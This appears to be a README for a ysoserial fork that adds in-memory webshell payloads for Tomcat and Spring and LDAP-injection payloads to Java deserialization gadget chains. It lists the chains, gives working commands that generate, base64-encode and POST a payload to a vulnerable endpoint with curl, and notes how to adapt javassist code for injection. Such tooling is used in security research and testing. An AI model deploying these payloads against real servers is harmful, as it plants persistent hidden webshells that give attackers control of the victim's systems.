# Ysoserial4Memshell
研究 Ysoserial 運作原理，並將 Payload 新增內存馬及LDAP注入功能。
內存馬現已完成 Tomcat 及 Spring 兩種版本。

* for Memshell
  * `java -jar Mem-ysoserial-master.jar CommonsCollections2Mem tomcat`
  * `java -jar Mem-ysoserial-master.jar CommonsCollections2Mem spring`

```
Payload                 Authors                                Dependencies                                                                             
CommonsBeanutils1Mem    @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                    
CommonsCollections2Mem  @frohoff                               commons-collections4:4.0                                                                 
CommonsCollections3Mem  @frohoff                               commons-collections:3.1                                                                  
CommonsCollections4Mem  @frohoff                               commons-collections4:4.0                                                                 
JSON1Mem                @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
Jdk7u21Mem              @frohoff            
```

* for Ldap Injection
  * `java -jar Mem-ysoserial-master.jar CommonsBeanutils1Ldap "ldap://127.0.0.1:1389/test"`
  
```
Payload                 Authors                                Dependencies                                                                             
CommonsBeanutils1Ldap   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                    
CommonsCollections1Ldap @frohoff                               commons-collections:3.1                                                                  
CommonsCollections2Ldap @frohoff                               commons-collections4:4.0                                                                 
CommonsCollections3Ldap @frohoff                               commons-collections:3.1                                                                  
CommonsCollections4Ldap @frohoff                               commons-collections4:4.0                                                                 
CommonsCollections5Ldap @matthias_kaiser, @jasinner            commons-collections:3.1                                                                  
CommonsCollections6Ldap @matthias_kaiser                       commons-collections:3.1                                                                  
CommonsCollections7Ldap @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                      
```

# Demo
* Tomcat
```
docker build -t tomcatdeserial . --no-cache
docker run -p8080:8080 tomcatdeserial

java -jar Mem-ysoserial-master.jar CommonsCollections2Mem tomcat > 1.ser
cat 1.ser | base64 | sed ":a;N;s/\n//g;ta" > 1.b64
echo data=`cat 1.b64` | curl http://127.0.0.1:8080/inject.jsp -d @-
```

* Spring:
```
java -jar Mem-ysoserial-master.jar CommonsCollections2Mem spring > 1.ser
cat 1.ser | base64 | sed ":a;N;s/\n//g;ta" > 1.b64
echo data=`cat 1.b64` | curl http://127.0.0.1:8080/hello -d @-
```

# Analysis
以 CommonsCollections 為例，下面說明幾種利用方式：
* 運用 Runtime.getRuntime().exec("") 觸發
  * 用來注入系統指令
* 運用 javassist 觸發
  * 可以注入 java 程式碼，Ysoserial 用 Gadgets.java 封裝
  * 可以更靈活操作 Payload
  * javassist 需修改的項目
```
1. 將所有的 Class 用完整路徑表示
	Field => java.lang.reflect.Field
2. javassist 不支援 generics，需註解所有<xxx>
	java.util.ArrayList<Object> => java.util.ArrayList/*<Object>*/
3. javassist 不支援可變參數呼叫
	ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
		=> ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
	method.invoke(classLoader, bytes, 0, bytes.length);
		=> method.invoke(classLoader, new Object[]{bytes, 0, bytes.length});
4. javassist 中 int 並非 Object，需要用 Integer 替代
	0 => new Integer(0)
5. 若有 Exception，在 catch 中需要使用 throw 拋出例外
	catch(Exception ex){throw ex;}
```
